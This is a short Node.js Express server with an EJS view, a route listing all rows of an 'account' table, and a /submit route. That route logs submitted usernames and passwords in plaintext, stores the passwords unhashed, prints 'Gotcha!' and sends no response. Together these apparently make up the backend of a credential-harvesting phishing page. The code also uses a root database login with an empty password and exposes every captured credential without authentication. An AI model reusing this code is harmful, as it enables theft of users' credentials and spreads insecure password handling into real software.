const express = require('express');
const ejs = require('ejs');
const bodyParser = require('body-parser');
const cors = require('cors');


const app = express();
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
const mysql = require('mysql2');
const con = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: '',
    database: 'demonse'
});
let requestCount = 0;

function countRequests(req, res, next) {
  requestCount++;
  console.log(`Total Requests: ${requestCount}`);
  next();
}

app.use(countRequests);
app.get('/', (req, res) => {
    const data = {
        title: 'My EJS View',
        message: 'Hello, EJS!'
    };
    ejs.renderFile('./views/index.ejs', data, (err, html) => {
        if (err) {
            console.log(err);
            res.status(500).send('Error rendering view');
        } else {
            res.send(html);
        }
    });
});
app.get('/list', (req, res) => {
    con.query('SELECT * FROM account ORDER BY id DESC', (err, results) => {
        if (err) {
            console.error(err);
        } else {
            res.render('list', { users: results });
        }
    });
});

app.post('/submit', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    con.query('INSERT INTO account (username, password) VALUES (?, ?)', [username, password], (err, results) => {
        if (err) {
            console.error(err);
        } else {
            console.log('Gotcha!');
        }
    });
});
app.listen(3000, () => {
    console.log('Server started on port 3000');
});
